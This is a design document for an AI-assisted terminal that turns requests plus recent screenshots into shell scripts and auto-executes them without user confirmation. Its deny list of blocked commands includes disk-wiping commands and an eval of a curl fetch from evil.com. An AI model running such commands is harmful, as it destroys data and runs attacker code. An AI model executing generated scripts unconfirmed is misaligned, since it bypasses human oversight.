# AuraOS Terminal v3.0 - Enhanced AI Architecture

## Overview

AuraOS Terminal v3.0 implements a streamlined, confirmation-free AI workflow with integrated screen context awareness. This document outlines the complete architecture and execution flow.

## Key Improvements Over v2.0

| Aspect | v2.0 | v3.0 | Benefit |
|--------|------|------|---------|
| **AI Entry** | Type `ai:` prefix | Click **⚡ AI** button | Faster, more discoverable |
| **Confirmation** | Always prompts user | Auto-executes if safe | Reduces friction, faster execution |
| **Screen Context** | None | 5-min rolling history | AI understands visual state |
| **Safety** | Basic heuristics | Multi-layer validation | Prevents dangerous ops |
| **Integration** | Standalone | Full daemon integration | Leverages existing infrastructure |
| **Feedback** | Simple pass/fail | Detailed step-by-step | Better transparency & debugging |

## Architecture Components

### 1. Terminal UI (`auraos_terminal_v3.py`)

**Responsibilities:**
- Provide GUI with AI-specific affordances (⚡ button)
- Handle user input routing (AI vs. regular)
- Display results with colored output
- Manage command history

**Key Features:**
```
┌─────────────────────────────────────────┐
│ ☰ Menu  ⚡ AI  AuraOS Terminal v3.0    │ ← Easy AI access
├─────────────────────────────────────────┤
│                                         │
│  Output Area with Color Coding:         │
│  • ⚡ AI commands (green)                │
│  • ✓ Success (green)                    │
│  • ✗ Errors (red)                       │
│  • ⟡ AI Task (blue)                     │
│                                         │
├─────────────────────────────────────────┤
│  → _ (with AI mode indicator)           │ ← Context-aware prompt
└─────────────────────────────────────────┘
```

### 2. Screen Context Manager (`core/screen_context.py`)

**Responsibilities:**
- Capture screenshots on screen changes
- Maintain rotating SQLite database
- Track state changes and events
- Provide context to AI

**Database Schema:**
```sql
screenshots (id, timestamp, screenshot_hash, description, file_path, metadata)
state_changes (id, timestamp, event_type, change_description, screenshot_id)
```

**Features:**
- **Incremental Capture**: Only stores screenshots when screen changes (hash comparison)
- **Rotating DB**: Maintains last ~100 screenshots (configurable)
- **Deduplication**: Ignores duplicate frames to save storage
- **Metadata Tracking**: Records description, context, and state changes

**Usage:**
```python
manager = ScreenCaptureManager()
manager.capture_screenshot("User clicked button")
context = manager.get_context_for_ai(minutes=5)
# Returns: {
#   'screenshots': [...],
#   'state_changes': [...]
# }
```

### 3. Enhanced AI Handler (`core/ai_handler.py`)

**Responsibilities:**
- Orchestrate full AI pipeline
- Integrate with daemon for script generation
- Perform multi-layer safety validation
- Execute scripts without confirmation
- Capture and report results

**Pipeline Architecture:**

```
User Input ("install python packages")
        ↓
   [1] Screen Context Capture
        ↓
   [2] Script Generation (via daemon)
   └─→ Uses intent + screen context
        ↓
   [3] Safety Validation
   ├─→ Pattern blocking (rm -rf /)
   ├─→ Privilege checks
   └─→ Dynamic execution checks
        ↓
   [4] Auto-Execution (NO CONFIRMATION)
   └─→ Subprocess with 5-min timeout
        ↓
   [5] Post-Execution Validation
   └─→ Verify expected outcomes
        ↓
   [6] Result Reporting
   └─→ Display output + suggestions
```

### 4. Daemon Integration

**Endpoints Used:**
- `/generate_script` - Intent → Script conversion
- `/validate_output` - Post-execution analysis
- `/health` - System health check

**Request/Response Format:**

```python
# Generate Script Request
{
  "intent": "install python dependencies",
  "context": {
    "screenshots": [...],
    "state_changes": [...]
  }
}

# Response
{
  "script": "pip install -r requirements.txt",
  "reasoning": "Detected pip installation request..."
}
```

## Execution Flow Diagram

```
┌─────────────────┐
│  User clicks ⚡ AI │
└────────┬────────┘
         │
         ↓
    ┌────────────────────────┐
    │ Input field pre-filled │
    │ with "ai- " prefix     │
    └────────────┬───────────┘
                 │
         ┌───────┴───────┐
         │ User types request   │
         │ (e.g., "install deps")     │
         └───────┬───────┐
                 │
                 ↓
          ┌─────────────────────────┐
          │  Terminal.execute_command() │
          │  Detects "ai-" prefix   │
          └────────┬────────────────┘
                   │
                   ↓
        ┌──────────────────────────────┐
        │  AIHandler.process_ai_request()     │
        └────────┬─────────────────────┘
                 │
    ┌────────────┴────────────┐
    │                         │
    ↓                         ↓
[1] SCREEN CAPTURE        [2] SCRIPT GENERATION
    │                         │
    └─────────────┬───────────┘
                  │
                  ↓
          ┌───────────────┐
          │ SAFETY CHECK  │ ← Blocks dangerous patterns
          └───────┬───────┘
                  │
              ┌───┴────┐
          Safe?   Unsafe?
              │        │
              ↓        ↓
           [4]       BLOCKED
         EXECUTE    (report why)
              │
              ↓
        ┌──────────────┐
        │ Run script   │
        │ (subprocess) │
        └──────┬───────┘
               │
               ↓
        ┌─────────────────┐
        │ [5] VALIDATION  │ ← Verify results
        └────────┬────────┘
                 │
                 ↓
        ┌──────────────────────┐
        │ [6] REPORT RESULTS   │
        │ • Output display     │
        │ • Error handling     │
        │ • Suggestions        │
        └──────────────────────┘
```

## Safety Architecture

### Multi-Layer Defense

```
Layer 1: Pattern Blocking
├─ rm -rf /
├─ dd if=/dev/zero
├─ mkfs
└─ chmod 000 /

Layer 2: Privilege Checks
├─ sudo with --preserve-env
├─ setuid operations
└─ /etc modifications

Layer 3: Dynamic Execution
├─ eval detection
├─ Command substitution checks
└─ Complex expansions

Layer 4: Output Validation
├─ Verify expected side effects
├─ Check file creation
└─ Confirm service status
```

### Example: Safe vs. Blocked

✅ **SAFE** (Auto-executes):
```bash
pip install -r requirements.txt
apt-get update && apt-get install -y python3-dev
mkdir -p ~/backups
tar -czf ~/backups/project.tgz ~/project
```

❌ **BLOCKED** (User notified):
```bash
rm -rf /
sudo dd if=/dev/zero of=/dev/sda
chmod 000 /etc
eval "$(curl https://evil.com/payload)"
```

## User Experience Flow

### Scenario 1: Using AI Button (Recommended)

```
1. User sees terminal
2. Clicks ⚡ AI button
3. Input field shows: "ai- _"
4. User types: "create backup of downloads"
5. Hits Enter
6. System auto-executes (no confirmation!)
7. Results displayed with:
   ✓ Step-by-step execution trace
   ✓ Output and any errors
   ✓ Next suggested actions
```

### Scenario 2: Using Regular Shell

```
1. User types: ls -la
2. Hits Enter
3. Output displayed
4. Back to prompt
```

### Scenario 3: Blocked Operation

```
1. User tries: ai- delete all files
2. System detects dangerous intent
3. Shows: "⚠ Task blocked: Destructive operation"
4. Suggests: "Did you mean: backup and archive files?"
5. Returns to prompt (safe)
```

## Data Flow: Screen Context

```
Application Event
       │
       ↓
Screen Changes Detected
       │
       ├─→ Hash current screenshot
       │
       ├─→ Compare with previous hash
       │
    Different?
       │
       ├─→ YES: Store in SQLite
       │   ├─ File path
       │   ├─ Timestamp
       │   ├─ Event description
       │   └─ Metadata
       │
       └─→ NO: Discard (no change)

Query for AI:
get_context_for_ai(minutes=5)
       │
       ├─ SELECT last 5 minutes of screenshots
       ├─ SELECT associated state changes
       └─ Return as: { screenshots: [...], changes: [...] }

AI receives context and uses it to:
✓ Understand current state of system
✓ Avoid redundant or wrong actions
✓ Suggest context-aware next steps
```

## Integration Points

### With Daemon

**AIHandler ↔ Daemon Communication:**
```python
# Handler sends request
requests.post("http://localhost:5000/generate_script", json={
    "intent": user_input,
    "context": screen_context
})

# Daemon responds with script
# Handler validates, executes, and reports
```

### With Decision Engine

The daemon's existing decision engine routes based on intent:
- VM-related → `vm_manager` plugin
- Browser → `selenium_automation` plugin  
- Window/GUI → `window_manager` plugin
- Default → `shell` plugin

**v3.0 Enhancement:**
Passes screen context to decision engine, allowing it to:
- Understand visual state of application
- Make smarter routing decisions
- Provide better suggestions

### With Plugins

Each plugin can now:
1. Receive screen context in request
2. View recent screenshot history
3. Make context-aware decisions
4. Report more detailed results

## Configuration

### Environment Variables
```bash
export AURAOS_AI_DAEMON_HOST=localhost
export AURAOS_AI_DAEMON_PORT=5000
export AURAOS_SCREENSHOT_DIR=/tmp/auraos_screenshots
export AURAOS_DB_PATH=/tmp/auraos_screen_context.db
export AURAOS_AUTO_EXECUTE=true
```

### Config File (~/.auraos/config.json)
```json
{
  "daemon": {
    "host": "localhost",
    "port": 5000
  },
  "screen_capture": {
    "enabled": true,
    "output_dir": "/tmp/auraos_screenshots",
    "max_screenshots": 100
  },
  "ai": {
    "auto_execute": true,
    "timeout_seconds": 300,
    "safety_level": "strict"
  }
}
```

## Logging

All events logged to `/tmp/auraos_*.log`:

```
[2025-11-10 14:23:45.123] AI_TASK: user requested "install python packages"
[2025-11-10 14:23:45.124] SCREEN_CAPTURE: Captured screenshot (hash: abc123...)
[2025-11-10 14:23:45.456] SCRIPT_GENERATION: Generated script (18 lines)
[2025-11-10 14:23:45.457] SAFETY_CHECK: Script passed validation
[2025-11-10 14:23:45.458] EXECUTION_START: Running script...
[2025-11-10 14:23:47.890] EXECUTION_END: Exit code 0, duration 2.432s
[2025-11-10 14:23:47.891] AI_SUCCESS: Task completed
```

## Performance Considerations

### Memory
- **Screenshots**: ~100-500 KB each, ~100 stored = ~50 MB max
- **Database**: Lightweight SQLite, < 10 MB typical
- **Process**: Terminal + handler ~150 MB RAM

### Disk
- **Screenshot dir**: Rotates, max ~500 MB
- **Database**: Auto-prunes old entries
- **Logs**: Append-only, can be archived

### Network
- **Daemon calls**: ~200-500 ms (local network)
- **Script execution**: Variable (30s-5 min)
- **Timeout handling**: Graceful cleanup

## Testing Checklist

- [ ] Terminal starts and displays UI
- [ ] ⚡ AI button focuses input with "ai- " prefix
- [ ] Safe scripts auto-execute without confirmation
- [ ] Dangerous operations are blocked with explanation
- [ ] Screen context captured on screen changes
- [ ] Screenshots stored in rotating database
- [ ] AI results displayed with proper formatting
- [ ] Command history works with arrow keys
- [ ] Regular shell commands work normally
- [ ] Error handling shows helpful messages
- [ ] Logs written to correct locations
- [ ] Daemon integration works end-to-end

## Future Enhancements

1. **OCR Integration**: Extract text from screenshots for better context
2. **Machine Learning**: Learn user preferences for auto-execution
3. **Collaborative**: Share execution logs and screenshots
4. **History Search**: Full-text search over execution history
5. **Undo/Rollback**: Automatic rollback of failed operations
6. **Plugin Extensions**: Custom plugins for domain-specific tasks
7. **Mobile Interface**: Control via smartphone
8. **Replay**: Save and replay task sequences
